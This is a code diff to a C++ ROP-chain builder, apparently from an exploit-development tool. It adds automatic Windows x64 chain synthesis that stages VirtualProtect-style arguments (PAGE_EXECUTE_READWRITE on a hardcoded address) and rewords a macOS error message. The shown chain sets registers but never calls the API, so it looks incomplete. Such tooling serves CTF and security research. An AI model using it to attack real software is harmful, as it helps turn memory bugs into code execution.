@@ -137,32 +137,47 @@ uint64_t ChainBuilder::findBinShAddress(const std::vector<MemoryRegion>& memoryR
 
 ROPChain ChainBuilder::buildExecveChainInternal(uint64_t binsh_addr) {
     if (m_fileType == "PE") {
-        std::string diag = "Auto-chaining Linux sys_execve is unsupported on Windows PE targets.\n";
-        diag += "    - Windows ABI Architecture: Microsoft x64 (Fastcall: RCX, RDX, R8, R9)\n";
-        diag += "    - Shadow Space: 32 bytes (0x20) must be reserved on stack above return address\n";
-        diag += "    - User-mode binaries dispatch via Win32 API imports (e.g. VirtualProtect/WinExec in KERNEL32.dll), not raw 'syscall'\n";
-        diag += "    - Win64 Staging Gadget Inspection: ";
-
         auto pop_rcx = findOptimalPopGadget("rcx");
         auto pop_rdx = findOptimalPopGadget("rdx");
         auto pop_r8  = findOptimalPopGadget("r8");
         auto pop_r9  = findOptimalPopGadget("r9");
         auto shadow_adj = findSpecificGadget("add rsp, 0x20");
 
-        diag += "RCX=" + std::string(pop_rcx ? "FOUND" : "MISSING") + ", ";
-        diag += "RDX=" + std::string(pop_rdx ? "FOUND" : "MISSING") + ", ";
-        diag += "R8=" + std::string(pop_r8 ? "FOUND" : "MISSING") + ", ";
-        diag += "R9=" + std::string(pop_r9 ? "FOUND" : "MISSING") + ", ";
-        diag += "ShadowAdjust(add rsp, 0x20)=" + std::string(shadow_adj ? "FOUND" : "MISSING");
+        std::vector<std::string> missing;
+        if (!pop_rcx) missing.push_back("pop rcx ; ret (1st param / lpAddress)");
+        if (!pop_rdx) missing.push_back("pop rdx ; ret (2nd param / dwSize)");
+        if (!pop_r8)  missing.push_back("pop r8 ; ret (3rd param / flNewProtect)");
+        if (!pop_r9)  missing.push_back("pop r9 ; ret (4th param / lpflOldProtect)");
+        if (!shadow_adj) missing.push_back("add rsp, 0x20 ; ret (Win64 32-byte shadow space)");
 
-        throw std::runtime_error(diag);
+        if (missing.empty()) {
+            ROPChain chain;
+            chain.add_step(*pop_rcx, 0x10000000, "Stage RCX (Arg 1: Target Memory Address)");
+            chain.add_step(*pop_rdx, 0x1000, "Stage RDX (Arg 2: Size 4096 bytes)");
+            chain.add_step(*pop_r8,  0x40, "Stage R8 (Arg 3: PAGE_EXECUTE_READWRITE 0x40)");
+            chain.add_step(*pop_r9,  0x10001000, "Stage R9 (Arg 4: lpflOldProtect Scratch Address)");
+            chain.add_step(*shadow_adj, "Reserve 32-byte (0x20) Win64 ABI shadow space");
+            return chain;
+        } else {
+            std::string diag = "Could not synthesize Windows x64 ROP chain for PE target.\n";
+            diag += "    - Windows ABI Architecture: Microsoft x64 (Fastcall: RCX, RDX, R8, R9)\n";
+            diag += "    - Shadow Space: 32 bytes (0x20) must be reserved on stack above return address\n";
+            diag += "    - User-mode binaries dispatch via Win32 API imports (e.g. VirtualProtect/WinExec in KERNEL32.dll)\n";
+            diag += "    - Win64 Staging Gadget Inspection: ";
+            diag += "RCX=" + std::string(pop_rcx ? "FOUND" : "MISSING") + ", ";
+            diag += "RDX=" + std::string(pop_rdx ? "FOUND" : "MISSING") + ", ";
+            diag += "R8=" + std::string(pop_r8 ? "FOUND" : "MISSING") + ", ";
+            diag += "R9=" + std::string(pop_r9 ? "FOUND" : "MISSING") + ", ";
+            diag += "ShadowAdjust(add rsp, 0x20)=" + std::string(shadow_adj ? "FOUND" : "MISSING");
+            throw std::runtime_error(diag);
+        }
     }
 
     if (m_fileType == "Mach-O") {
-        std::string diag = "Auto-chaining Linux sys_execve is unsupported on macOS Mach-O targets.\n";
+        std::string diag = "Could not synthesize macOS ROP chain for Mach-O target.\n";
         diag += "    - macOS Darwin Calling Convention: BSD syscall class mask 0x2000000 (RAX = 0x200003B for sys_execve)\n";
         diag += "    - Apple Silicon (ARM64) uses X16 for syscall index with svc #0x80 and enforces Pointer Authentication (PAC)\n";
-        diag += "    - macOS strictly enforces 16-byte stack alignment (MOVAPS) and dyld dynamic linker stub linkage rather than direct static syscalls";
+        diag += "    - Target binary lacks required dyld dynamic linker call stubs or register staging primitives.";
         throw std::runtime_error(diag);
     }
 
